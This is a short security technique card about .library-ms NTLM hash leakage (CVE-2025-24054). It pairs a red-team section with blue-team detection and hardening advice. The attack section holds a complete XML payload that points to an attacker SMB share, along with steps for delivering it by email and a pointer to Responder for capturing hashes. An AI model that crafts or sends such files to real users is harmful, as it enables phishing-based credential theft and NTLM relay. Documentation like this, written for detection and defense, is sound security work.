# [CA-FORCE-002]: .library-ms NTLM Hash Leakage (CVE-2025-24054)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORCE-002 |
| **MITRE ATT&CK v18.1** | [Forced Authentication (T1187)](https://attack.mitre.org/techniques/T1187/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **CVE** | **CVE-2025-24054** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique exploits the Windows Library file format (`.library-ms` or `.searchConnector-ms`). These XML-based files define "virtual folders" that aggregate content from multiple locations. By defining a remote location (`<url>\\attacker\share</url>`), Windows Explorer automatically authenticates to the remote share via SMB/WebDAV when the file is parsed (e.g., extracted from a ZIP or viewed). This often bypasses Mark-of-the-Web (MotW) protections in some scenarios or user vigilance because "Libraries" look like legitimate system components.
- **Attack Surface:** Phishing Attachments (ZIP/ISO), Shared Folders.
- **Business Impact:** **Stealthy Credential Theft**. Unlike `.scf`, these files can persist and look like valid search results.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Ability to deliver a file.
- **Tools:**
    - Text Editor (Notepad)
    - [Responder](https://github.com/lgandx/Responder)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create Payload**
Save as `Reports.library-ms`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@Windows.Storage.Dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>\\attacker_ip\sharename</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

**Step 2: Deploy**
Send via email inside a ZIP or place on a public share.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Endpoint Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Sysmon** | `FileCreate` (Event 11) | Creation of files ending in `.library-ms` or `.searchConnector-ms` by non-system processes (e.g., `7zFM.exe`, `Explorer.exe` from Temp). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **File Block:** Block `.library-ms` and `.searchConnector-ms` extensions at the Email Gateway and Web Proxy.
*   **Restrict NTLM:** Set "Restrict NTLM: Outgoing NTLM traffic to remote servers" to **Deny all**.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PHISH-001]
> **Next Logical Step:** [LAT-CLASSIC-002] (NTLM Relay)
